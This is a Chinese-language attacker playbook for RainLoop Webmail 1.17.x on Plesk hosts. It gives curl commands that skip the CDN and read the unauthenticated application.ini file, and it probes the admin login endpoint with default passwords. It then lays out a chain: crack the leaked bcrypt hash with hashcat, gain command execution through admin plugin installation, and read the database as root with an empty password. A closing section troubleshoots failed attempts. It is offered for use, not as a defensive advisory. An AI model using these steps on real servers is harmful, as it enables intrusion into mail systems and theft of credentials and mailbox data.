# RainLoop Webmail data 目录未鉴权 → application.ini 全量配置泄露

## 前置条件
- 目标为 RainLoop Webmail（1.17.x），常见于 Plesk 托管。
- 能直连源站 IP 并用目标 vhost 的 Host 头（Cloudflare 后的源站：curl -k + --noproxy '*'）。
- `/data/` 未做访问控制（目录禁列不等于文件禁读）。

## 1) 匿名读配置
```bash
curl -sk --noproxy '*' -A "$UA" -H "Host: <vhost>" -D - \
  "https://<origin-ip>/data/_data_/_default_/configs/application.ini"
```
命中判据：
- HTTP 200；`content-length` 数千~万字节（实测 9127）；
- `last-modified` 长期不变（配置多年未改）；`x-powered-by: PleskLin`；
- 正文为 INI：
```ini
admin_login = "admin"
admin_password = "$2y$10$<REDACTED>"   # bcrypt
...
pdo_dsn = "mysql:host=127.0.0.1;port=3306;dbname=rainloop"
pdo_user = "root"
pdo_password = ""
...
[version]
current = "1.17.0"
```

## 2) 管理面板可达性 + 口令是否默认
```bash
curl -sk --noproxy '*' -A "$UA" -H "Host: <vhost>" -X POST "https://<origin-ip>/?/Ajax/" \
  -d 'Action=AdminLogin&Login=admin&Password=<try-a-default>'
```
期望：
```json
{"Action":"AdminLogin","Result":false,"ErrorCode":101,"ErrorMessage":"","ErrorMessageAdditional":"","Time":12}
```
- `ErrorCode 101` = 鉴权失败但面板启用、动作被真实处理 → 拿泄露的 bcrypt 离线跑字典后再回此端点验证登录；
- `Result:true` = 直接进管理面板。

## 3) 拿配置后的利用链
- `admin_password` 是 bcrypt（`$2y$10$`）→ `hashcat -m 3200` 离线强度验证 → 登录 `/?admin`；
- RainLoop 1.17.x 管理面板可安装/激活插件包（packages）→ 命令执行面；
- `pdo_user=root` / `pdo_password` 空 → 若 MySQL `127.0.0.1:3306` 可从本机或 SSRF 触达，直接读库（RainLoop 库内另有邮箱用户表）；
- 配置中的域名/路径可辅助定位同源 Plesk 主机上的其它 vhost。

## 失败常见原因
- 经 CDN 打会被缓存/拦截 → 必须直连源站 IP 并保留正确 Host；
- `/data/` 返回 403 但文件可读 → 继续按已知路径直接请求文件；
- 路径随版本不同（`/data/_data_/_default_/configs/application.ini` 是 1.17 默认布局）；
- `admin_password` 为空 = 面板未设密码或走其它认证方式。